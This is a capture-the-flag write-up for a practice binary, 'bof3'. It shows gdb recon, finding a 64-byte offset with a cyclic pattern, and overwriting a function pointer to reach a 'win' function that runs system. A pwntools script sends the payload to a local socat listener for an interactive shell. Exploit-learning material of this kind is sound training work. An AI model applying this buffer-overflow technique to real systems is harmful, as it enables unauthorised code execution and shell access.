# Bof3 Writeup

## Recon
The first step to breaking this binary is to get the ASM output of the binary. This can be done through: `objdump -d -M intel bof3 > bof3.asm`. After is done, you can begin determining which functions are breakable in GDB.

As we scroll through the asm file in an editor of your choice, we will see that there are `win, lose, and main` functions. These are the functions in which we will need to set breakpoints so that we can begin to walk the code execution paths.

## Vulnerability Analysis
Looking at the individual functions, we can begin to see the general idea for the code execution path of the program.

Within the main function, we can see references to the lose function:

Register values at this instruction:
```asm
EAX: 0x80484b4 (<lose>:	push   ebp)
EBX: 0xf7fc1ff4 --> 0x1a2d7c 
ECX: 0x1 
EDX: 0xf7fc38c4 --> 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0xffffd1b8 --> 0x0 
ESP: 0xffffd150 --> 0x80485fd --> 0x1007325 
EIP: 0x80484fc (<main+42>:	call   eax)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
```
ASM:
```asm
   0x804851c <main+41>:	add    esp,0x10
   0x804851f <main+44>:	mov    eax,DWORD PTR [ebp-0xc]
=> 0x8048522 <main+47>:	call   eax                         ; This is the point in which it calls the address of lose
```
Based on this, we can tell that we need to overwrite the code execution path so that we do not hit the lose function. In this case, it requires us overwritting the value of `EAX` to point to the `win` function before we get to the `call eax` instruction.

## Exploitation
Given that we know this program accepts input through scanf, we can assume we have a buffer that will be storing whatever we enter into the program. This means that we may have the opportunity to overflow the buffer to gain control of the stack, which is required to modify the value of `EAX` before the `call eax` instruction.

To exploit this type of program, one of the easiest way to get a rough estimate of how much data to send to the program to hit a buffer overflow is to look at the prologue:
```asm
   0x80484d2 <main>:	push   ebp
   0x80484d3 <main+1>:	mov    ebp,esp
   0x80484d5 <main+3>:	and    esp,0xfffffff0
   0x80484d8 <main+6>:	sub    esp,0x60
```
Based on this we can see that we were allocated roughly 96 bytes on the stack for variables/operations (indicated by `sub esp,0x60`). Therefore, we can now get a rough estimate for how many characters we need to send to the program to get undefined behaviour (in this case, I use 100).

One of the easiest ways to figure out how many characters it takes to get to the value of EAX on the stack is to use the `pattern` command in gdb:
```sh
gdb-peda$ pattern create 100 u_pattern.txt
Writing pattern of 100 chars to filename "u_pattern.txt"
```
This creates a pattern string of unique sequences that we can enter as input to our program while it is running in gdb. This allows us to search for the index of a particular sequence we find in the eax register after we input the string into the program. This index then gives us the indication as to how many characters are needed before we can overwrite the address in `EAX`.

To use this pattern in gdb, you set your breakpoints and run: `r < u_pattern.txt`. Once this is done, you can now `next` until you hit the `call eax` instruction. Once there, you can observe that the `EAX` register contains the value of a sequence within your pattern string, instead of the address to `lose`. In order to make this useful to you, you must save this sequence (copy it into gedit/nano/notepad/etc) to find the index for later on. In my case, the sequence was:
```asm
EAX: 0x41644141 ('AAdA')
```
Now that we have the sequence, we now have to find out what index this is within the pattern string. To do this, we can do the following:
```sh
$ cat u_pattern.txt
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
```
This will allow us to copy down our entire pattern string, which we will need so that we can find the index of our sequence within it. To find the index, I use python and the `.index()` function on a string type, as seen below:
```sh
$ python
Python 2.7.3 (default, Jun 22 2015, 19:33:41) 
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL".index("AAdA")
64
>>> exit()
```
This allows us to see that it took 64 bytes to reach the value of `EAX` on the stack before the `call eax` instruction. Knowing this, we can now build our exploit string. Since we know that it takes 64 bytes to reach the address read into `EAX`, we can send 64 bytes of whatever character we want. In my case, i use the character `"A"`. We then append the packed address of the `win` function, which contains a system call, to our exploit string. This will allow us to call the `win` function, instead of the `lose` function. Therefore, we will take advantage of the `pwntools` module for the `p32` function to pack our function's address. Therefore, we would use `p32(0x08048494)` to get the packed value of the win function address.

Once we are done with this, we can test our exploit by doing:
```sh
$ python -c "from pwn import *; print ('A' * 64) + p32(0x08048494)" > exploit_string.txt
```
followed by opening gdb with the executable again, resetting the breakpoints, and running with `r < exploit_string.txt` to now supply the input with our exploit string. You can then next all the way to the `call eax` instruction. Once there, you can see how we now have the address of the `win` function in `EAX`. Therefore, if you hit `next` once again, we should now be within the `win` function:
```asm
=> 0x804849a <win+6>:	mov    DWORD PTR [esp],0x80485e0
   0x80484a1 <win+13>:	call   0x8048380 <puts@plt>
   0x80484a6 <win+18>:	mov    DWORD PTR [esp],0x80485ea
   0x80484ad <win+25>:	call   0x8048390 <system@plt>
   0x80484b2 <win+30>:	leave
```
Therefore, if we continue stepping through the function, we shoudl hit the line:
```asm
   0x80484ad <win+25>:	call   0x8048390 <system@plt>
```
which will provide us shell access in our program. Now, it is notable that we will not get shell access within GDB. however, we know that we hit the system call, which is all that really matters right now, as we now know that we are able to modify the code execution path to hit the system call. An example of what you may see in GDB once you hit the system call is as follows:
```sh
[New process 3372]
process 3372 is executing new program: /bin/dash
warning: Selected architecture i386:x86-64 is not compatible with reported target architecture i386
Architecture of file not recognized.
```

If we actually want to be able to get a shell, this will require us building a script to connect to this program running on localhost. Therefore, you will need to have `socat` running on your local so that you can connect to yourself through your exploit script.

Now, there is a copy of the exploit script within this directory of the repository that you can actively run instead of having to copy and paste the following excerpts, however, for the sake of clarity, I will be walking through the exploit script breifly:

First of all, you must import `pwntools`:
```py
from pwn import *
```
This imports all of the pwntool modules into the local namespace in python. You then need to set up your remote connection to connect to whatever IP and PORT you are listening to on `socat` (in my case, its `localhost:1234`):
```py
r = remote("localhost", 1234)
```
You then need to create your exploit to send to the application listening on this address:
```py
exploit = ("A" * 64) + p32(0x08048494)
```
Finally, you send your string to the application, and call the `.interactive()` function to create an interactive shell:
```py
r.send(exploit)
r.interactive()
```
There you go! You just owned the challenge!
